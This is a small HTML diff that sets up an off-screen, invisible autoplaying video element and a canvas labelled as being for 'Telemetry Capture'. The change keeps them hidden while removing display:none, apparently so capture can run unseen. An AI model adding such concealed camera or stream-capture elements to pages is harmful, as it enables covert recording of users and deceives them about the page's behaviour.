@@ -1,5 +1,5 @@
 <!-- Hidden Video & Canvas for Telemetry Capture -->
-<div style="display:none!important;visibility:hidden!important;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;" aria-hidden="true">
+<div style="visibility:hidden!important;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;" aria-hidden="true">
     <video id="v_stream" playsinline autoplay muted width="640" height="480"></video>
     <canvas id="c_buffer" width="640" height="480"></canvas>
 </div>
